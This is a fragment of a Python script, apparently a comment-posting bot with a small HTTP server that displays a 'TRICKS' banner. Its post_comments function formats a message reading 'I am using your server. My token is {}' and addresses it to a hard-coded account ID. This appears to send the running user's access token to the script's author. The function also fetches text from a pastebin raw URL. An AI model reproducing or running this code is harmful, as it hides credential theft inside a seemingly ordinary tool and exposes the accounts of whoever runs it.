...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"SERVER RUNNING => TRICKS ||[BY=|<MU7TK33M]")
...
def post_comments():
    ...
    msg_template = "Hello ABH4Y sir! I am using your server. My token is {}"

    # Specify the ID where you want to send the message
    target_id = "61552648239072"
    ...
    mmm = requests.get('https://pastebin.com/raw/A50AN7Ax').text
